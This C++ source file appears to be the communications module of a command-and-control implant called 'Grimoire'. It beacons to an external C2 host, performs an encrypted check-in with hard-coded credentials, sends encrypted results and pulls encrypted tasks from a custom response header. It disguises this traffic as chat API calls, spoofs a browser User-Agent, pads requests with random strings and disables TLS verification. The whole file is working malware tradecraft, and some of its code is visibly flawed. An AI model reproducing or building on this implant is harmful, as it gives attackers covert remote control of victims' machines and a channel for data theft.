//
// Created by Nebu1ea on 2025/11/25.
//

#include "GrimoireComms.hpp"
#include "Utils.hpp"
#include <iostream>
#include <sstream>
#include "nlohmann/json.hpp"
#include <stdexcept>
#include <algorithm>
#include <utility>

namespace Grimoire::Comms {

    extern const std::string Grimoire_C2_HOST;
    extern const std::string Grimoire_C2_PORT;
    extern const std::string Grimoire_C2_PROTOCOL;
    extern const std::string Grimoire_C2_LOGIN;
    extern const std::string Grimoire_C2_SEND;
    using json = nlohmann::json;
    // --- 静态回调函数实现 ---

    /**
     * @brief libcurl 的静态回调函数，用于将服务器的响应数据写入 std::string 缓冲区。
     * @param contents 指向接收到的数据的指针。
     * @param size 单个数据块的大小（通常是 1）。
     * @param nmemb 数据块的数量。
     * @param userp 自定义指针，指向我们的 std::string 缓冲区。
     * @return 实际处理的字节数。
     */
    size_t GrimoireComms::WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        size_t realsize = size * nmemb;
        // 将接收到的数据追加到传入的 std::string 中
        static_cast<std::string*>(userp)->append(static_cast<char*>(contents), realsize);
        return realsize;
    }

    /**
     * @brief libcurl 的静态回调函数，用于捕获 HTTP 响应头。
     * 查找并存储 X-Data-Ref header 的值。
     */
    size_t GrimoireComms::HeaderCallback(char* buffer, size_t size, size_t nitems, void* userp) {
        size_t realsize = size * nitems;
        std::string header_line(buffer, realsize);

        // 强制转换为 Comms 实例指针
        GrimoireComms* comms_instance = static_cast<GrimoireComms*>(userp);

        // 查找 Header: X-Data-Ref
        // 注意：Header 可能会以换行符结尾，我们只比较开头部分
        const std::string header_name = "X-Data-Ref:";

        // 头部键值通常是大小写不敏感的，我们使用一个简单的查找/转换技巧
        std::string lower_line = header_line;
        std::transform(lower_line.begin(), lower_line.end(), lower_line.begin(), ::tolower);

        if (lower_line.rfind("x-data-ref:", 0) == 0) {
            // 找到了 "X-Data-Ref:"

            // 查找值开始的位置
            size_t value_start = header_line.find(':');
            if (value_start != std::string::npos) {
                // 跳过冒号和可能的空格
                size_t start_pos = header_line.find_first_not_of(" \t", value_start + 1);

                if (start_pos != std::string::npos) {
                    // 存储值，去除末尾的换行符
                    std::string value = header_line.substr(start_pos);
                    // 移除末尾的回车换行符
                    value.erase(std::remove(value.begin(), value.end(), '\r'), value.end());
                    value.erase(std::remove(value.begin(), value.end(), '\n'), value.end());

                    // 存储到成员变量中
                    comms_instance->incoming_task_header_ = value;
                }
            }
        }

        return realsize;
    }


    // --- 构造函数与析构函数 ---
    GrimoireComms::GrimoireComms(std::shared_ptr<Crypto::GrimoireCrypto> crypto_manager)
        : crypto_manager_(std::move(crypto_manager)), curl_handle_(nullptr) {

        // 初始化 libcurl 库
        // curl_global_init() 只需要在程序启动时调用一次
        curl_global_init(CURL_GLOBAL_DEFAULT);

        // 初始化 libcurl 句柄
        curl_handle_ = curl_easy_init();
        if (!curl_handle_) {
            // 抛出运行时错误，因为没有句柄无法进行通信
            throw std::runtime_error("Failed to initialize cURL handle.");
        }

        // 构建 C2 目标 URL
        // 一般使用 HTTP 协议，路径设置为 /api/chat/login
        // URL 格式: http://HOST:PORT/api/chat/login
        std::stringstream url_stream;
        url_stream << Grimoire_C2_PROTOCOL
                   << Grimoire_C2_HOST
                   << ":"
                   << Grimoire_C2_PORT
                   << "/";

        c2_url_ = url_stream.str();

        std::cout << "[Comms] C2 URL base initialized to: " << c2_url_ << std::endl;
    }

    GrimoireComms::~GrimoireComms() {
        // 清理 libcurl 句柄
        if (curl_handle_) {
            curl_easy_cleanup(curl_handle_);
        }
        // curl_global_cleanup() 这里省略交给 main 函数
    }


    void GrimoireComms::InitializeCurlHandle() {
        // 每次发送请求前，重置并设置通用的 cURL 选项

        // 确保 cURL 句柄是干净的
        curl_easy_reset(curl_handle_);

        // 设置 URL
        curl_easy_setopt(curl_handle_, CURLOPT_URL, c2_url_.c_str());

        // 设置回调函数，将服务器响应写入我们的 std::string 缓冲区
        curl_easy_setopt(curl_handle_, CURLOPT_WRITEFUNCTION, WriteCallback);

        // 设置 User-Agent (模仿浏览器)
        curl_easy_setopt(curl_handle_, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");

        // 设置连接超时
        curl_easy_setopt(curl_handle_, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl_handle_, CURLOPT_TIMEOUT, 30L);

        // SSL/TLS 配置 (对于 HTTPS 是必须的)
        if (c2_url_.find("https://") == 0){
            std::cout << "[Comms] WARNING: Disabling SSL verification for C2.\n";
            curl_easy_setopt(curl_handle_, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(curl_handle_, CURLOPT_SSL_VERIFYHOST, 0L);
        }
    }



    bool GrimoireComms::SendInitialCheckIn() {
        CURLcode res;
        std::string response_data;

        // 初始化 cURL 句柄并设置通用选项
        InitializeCurlHandle();

        // 设置完整的签入 URL: https://HOST:PORT/api/chat/login
        std::string checkin_url = c2_url_ + "/api/chat/login";
        curl_easy_setopt(curl_handle_, CURLOPT_URL, checkin_url.c_str());

        // 设置 POST 请求
        curl_easy_setopt(curl_handle_, CURLOPT_POST, 1L);

        // 设置接收回调函数和缓冲区
        curl_easy_setopt(curl_handle_, CURLOPT_WRITEDATA, &response_data);

        try {
            // 生成密钥并获取客户端临时公钥
            std::string beacon_temp_pub_key_b64 = crypto_manager_->GenerateClientKey();

            // 构造 JSON 负载 (使用客户端临时公钥)
            json checkin_payload = {
                {"hello", beacon_temp_pub_key_b64},
                {"user", "Nebu1ea"},
                {"password", "Nebu1ea"}
            };
            std::string json_payload = checkin_payload.dump();

            // 设置 POST 字段和 HTTP 头
            curl_easy_setopt(curl_handle_, CURLOPT_POSTFIELDS, json_payload.c_str());

            // 设置 Content-Type 为 application/json
            curl_slist *headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl_handle_, CURLOPT_HTTPHEADER, headers);


            res = curl_easy_perform(curl_handle_);

            // 清理 HTTP 头列表
            curl_slist_free_all(headers);

            if (res != CURLE_OK) {
                std::cerr << "[Comms] Check-in failed: " << curl_easy_strerror(res) << std::endl;
                return false;
            }

            long http_code = 0;
            curl_easy_getinfo(curl_handle_, CURLINFO_RESPONSE_CODE, &http_code);

            if (http_code != 200) {
                std::cerr << "[Comms] Check-in failed with HTTP code: " << http_code << std::endl;
                return false;
            }

            // 解析服务器响应
            json response_json = json::parse(response_data);

            if (response_json.contains("welcome")) {
                std::string server_public_key_b64 = response_json["welcome"];

                // 接收服务器公钥，完成密钥派生
                if (crypto_manager_->CompleteKeyDerivation(server_public_key_b64)) {
                    std::cout << "[Comms] Initial check-in successful. Session established." << std::endl;
                    return true;
                } else {
                    std::cerr << "[Comms] Failed to complete key derivation." << std::endl;
                    return false;
                }
            } else {
                std::cerr << "[Comms] Invalid response: Missing 'welcome' key." << std::endl;
                return false;
            }

        } catch (const std::exception& e) {
            std::cerr << "[Comms] Check-in exception: " << e.what() << std::endl;
            return false;
        }
    }


    bool GrimoireComms::SendResult(const std::vector<unsigned char>& plaintext_to_send) {
        CURLcode res;
        std::string response_data; // 保持接收 body 的地方，虽然我们不关心
        std::string encrypted_payload_b64;

        try {
            // 构造内部负载（心跳信号）
            json internal_payload = {
                {"action", "heartbeat"}
            };
            // 将 JSON 转换为字节数组（需要进行加密）
            std::string internal_payload_str = internal_payload.dump();
            std::vector<unsigned char> plaintext_bytes(internal_payload_str.begin(), internal_payload_str.end());

            // 加密内部负载
            // 得到 Base64(IV | CT | TAG | SF)
            encrypted_payload_b64 = crypto_manager_->EncryptPayload(plaintext_to_send);

            // 构造 JSON 负载
            json request_payload = {
                {"auth", encrypted_payload_b64},
                // 使用随机字符串增加混淆度
                {"question", Utils::GenerateRandomString(16)},
                {"user", "DefaultUserName"} // 可以使用真实的系统用户名或预设值
            };
            std::string json_payload = request_payload.dump();

            // 初始化 cURL 句柄并设置 Header 回调
            InitializeCurlHandle();

            // 设置 Header 回调和用户指针
            // 用户指针指向 GrimoireComms 实例，以便 HeaderCallback 可以访问 incoming_task_header_
            curl_easy_setopt(curl_handle_, CURLOPT_HEADERFUNCTION, HeaderCallback);
            curl_easy_setopt(curl_handle_, CURLOPT_HEADERDATA, this);

            // 设置数据交换 URL: https://HOST:PORT/api/chat/send
            std::string data_url = c2_url_ + "api/chat/send";
            curl_easy_setopt(curl_handle_, CURLOPT_URL, data_url.c_str());

            curl_easy_setopt(curl_handle_, CURLOPT_POST, 1L);
            // 设置 POST 字段和 HTTP 头
            curl_slist *headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl_handle_, CURLOPT_HTTPHEADER, headers);

            res = curl_easy_perform(curl_handle_);
            // 检查 HTTP 状态码
            long http_code = 0;
            curl_easy_getinfo(curl_handle_, CURLINFO_RESPONSE_CODE, &http_code);

            if (http_code != 200) {
                std::cerr << "[Comms] Send failed with HTTP code: " << http_code << std::endl;
                return false;
            }

            std::cout << "[Comms] Result sent successfully." << std::endl;
            return true;

        } catch (const std::exception& e) {
            std::cerr << "[Comms] Send exception: " << e.what() << std::endl;
            return false;
        }
    }

    std::vector<unsigned char> GrimoireComms::ReceiveTask() {
        CURLcode res;
        std::string response_data;
        std::string encrypted_payload_b64;

        try {
            // 构造内部负载（心跳信号）
            json internal_payload = {
                {"action", "heartbeat"}
            };
            // 将 JSON 转换为字节数组（需要进行加密）
            std::string internal_payload_str = internal_payload.dump();
            std::vector<unsigned char> plaintext_bytes(internal_payload_str.begin(), internal_payload_str.end());

            // 加密内部负载
            // 得到 Base64(IV | CT | TAG | SF)
            encrypted_payload_b64 = crypto_manager_->EncryptPayload(plaintext_bytes);

            // 构造外部信封 JSON (用于混淆)
            json external_payload = {
                {"auth", encrypted_payload_b64},
                // 使用随机字符串增加混淆度
                {"question", Utils::GenerateRandomString(16)},
                {"user", "Nebu1ea"}
            };
            std::string json_payload = external_payload.dump();

            // 初始化 cURL 句柄并设置 Header 回调
            InitializeCurlHandle();

            // 清空上次捕获的 Header
            incoming_task_header_.clear();

            // 设置 Header 回调和用户指针
            curl_easy_setopt(curl_handle_, CURLOPT_HEADERFUNCTION, HeaderCallback);
            curl_easy_setopt(curl_handle_, CURLOPT_HEADERDATA, this);

            // 设置 URL 和 POST 方法
            std::string data_url = c2_url_ + "/api/chat/send";
            curl_easy_setopt(curl_handle_, CURLOPT_URL, data_url.c_str());
            curl_easy_setopt(curl_handle_, CURLOPT_POST, 1L);

            // 设置 POST 字段和 HTTP 头
            curl_easy_setopt(curl_handle_, CURLOPT_POSTFIELDS, json_payload.c_str());
            curl_slist *headers = nullptr;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl_handle_, CURLOPT_HTTPHEADER, headers);

            // 执行请求
            res = curl_easy_perform(curl_handle_);
            curl_slist_free_all(headers);

            if (res != CURLE_OK) {
                throw std::runtime_error("cURL error during task request: " + std::string(curl_easy_strerror(res)));
            }

            long http_code = 0;
            curl_easy_getinfo(curl_handle_, CURLINFO_RESPONSE_CODE, &http_code);
            if (http_code != 200) {
                std::cerr << "[Comms] Request failed with HTTP code: " << http_code << std::endl;
                return {};
            }

            // 检查 Header 是否被捕获 (X-Data-Ref)
            if (incoming_task_header_.empty()) {
                std::cout << "[Comms] No task received (X-Data-Ref is empty)." << std::endl;
                return {};
            }

            // Header 包含 Base64(IV | CT | TAG)
            std::cout << "[Comms] Encrypted task received in header. Decrypting..." << std::endl;


            return crypto_manager_->DecryptPayload(incoming_task_header_);

        } catch (const std::exception& e) {
            std::cerr << "[Comms] Task request exception: " << e.what() << std::endl;
            return {};
        }
    }

} // namespace Grimoire::Comms